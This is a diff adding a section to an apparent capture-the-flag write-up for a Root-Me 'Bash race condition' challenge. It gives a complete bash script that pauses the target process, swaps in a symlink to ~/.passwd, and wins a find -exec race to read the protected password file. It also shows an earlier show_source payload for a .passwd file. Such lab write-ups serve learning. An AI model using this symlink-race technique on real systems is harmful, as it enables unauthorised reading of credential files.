@@ -136,5 +136,74 @@ Wich will be interpreted as :
 ```php
 echo show_source(/challenge/app-script/ch13/passwd/.passwd);
 ```
+### BASH - Race condition
+[BASH - Race condition](https://www.root-me.org/fr/Challenges/App-Script/Bash-race-condition)
 
+### Payload
+
+First create a file in /tmp folder :
+
+```bash
+vi /tmp/pwned.sh
+```
+Then give them the rights :
+```bash
+chmod u+x /tmp/pwned.sh
+```
+ 
+Then copy the following script in the file :
+```bash
+#!/bin/bash
+
+
+DIRECTORY="/tmp/$PPID/$1"
+echo "Checking in: $DIRECTORY"
+
+while :; do
+    if [ -d "$DIRECTORY" ]; then
+        if [ "$(ls -A "$DIRECTORY")" ]; then
+
+            DIR_PATTERN="tmp.*"
+            FOUND_DIRS=$(find "$DIRECTORY" -type d -name "$DIR_PATTERN")
+
+            if [ -n "$FOUND_DIRS" ]; then 
+            	kill -SIGSTOP $1
+            	echo -n "data" > $FOUND_DIRS/pwned_file
+            	kill -SIGCONT $1
+           		ln -sf ~/.passwd $FOUND_DIRS/pwned_file
+                    while : ; do
+       					kill -SIGSTOP $1
+                    	unlink $FOUND_DIRS/pwned_file
+    					echo -n "data" > $FOUND_DIRS/pwned_file
+    					ln -sf ~/.passwd $FOUND_DIRS/pwned_file
+    					kill -SIGCONT $1
+    				[[ -e "$FOUND_DIRS" ]] || break
+					done
+                    break
+            else
+                echo "No directories found matching pattern '$DIR_PATTERN' in $DIRECTORY."
+            fi
+        else
+            echo "Directory $DIRECTORY exists but is empty."
+        fi
+    else
+        echo "Directory $DIRECTORY does not exist."
+    fi
+done
+```
+This scipts do a infinite loop and monitor the directories created by the challenge script, when he found a directory in /tmp that matchs he creates a symlink to $HOME/.passwd
+in order to do a race condition exploit on this command of the challenge script :
+```bash 
+find "$temp_dir" -type f -size 4c -exec cat {} + 
+```
+
+As stated here [Race condition with exec](https://www.gnu.org/software/findutils/manual/html_node/find_html/Race-Conditions-with-_002dexec.html)
+
+Then lauch it like this :
+```bash
+~/wrapper & /tmp/pwned.sh $!
+```
+
+Where $! is the pid of the processus ~/wrapper
+At the moment, the race is not always won by the script so relaunch it until you have a valid flag
 
